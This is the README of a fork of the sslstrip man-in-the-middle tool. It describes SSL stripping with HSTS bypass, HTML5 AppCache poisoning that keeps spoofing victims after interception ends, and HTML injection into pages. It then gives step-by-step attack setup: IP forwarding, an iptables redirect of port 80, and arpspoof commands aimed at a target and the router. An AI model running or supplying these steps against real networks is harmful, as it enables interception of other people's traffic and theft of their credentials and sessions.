sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
attacks with the new feature to avoid HTTP Strict Transport Security (HSTS) protection mechanism. by:Leonardo Nve

This fork can also perform response tampering attacks. (by Koto [Krzysztof Kotowicz])

One prepared example of tampering attack is HTML5 AppCache poisoning attack that places the 
modified responses in browsers long-lasting HTML5 AppCache so that the spoofing continues
even after the victim is no longer MITMed. This functionality has been added by Krzysztof Kotowicz
<kkotowicz at gmail dot com>

Option: -t <config>, --tamper <config>    Enable response tampering with settings from <config>.
Example: sslstrip -t app_cache_poison/config.ini


This fork can also inject code into HTML pages using a text file only. (by xtr4nge based on Kane Mathers commit)

Option: -i , --inject                     Inject HTML code.
Example: sslstrip -i inject.txt


It requires Python 2.5 or newer, along with the 'twisted' python module.

Installing:
	* Unpack: tar zxvf sslstrip-0.5.tar.gz
	* Install twisted:  sudo apt-get install python-twisted-web
	* (Optionally) run 'python setup.py install' as root to install, 
	  or you can just run it out of the directory.  

Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the 
	command-line options.

	The four steps to getting this working (assuming you're running Linux) 
	are:

	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

	2) Setup iptables to intercept HTTP requests (as root):
	   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
	
	3) Run sslstrip with the command-line options you'd like (see above).

	4) Run arpspoof to redirect traffic to your machine (as root):
	   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>

More Info:
	http://www.thoughtcrime.org/software/sslstrip/
	http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html
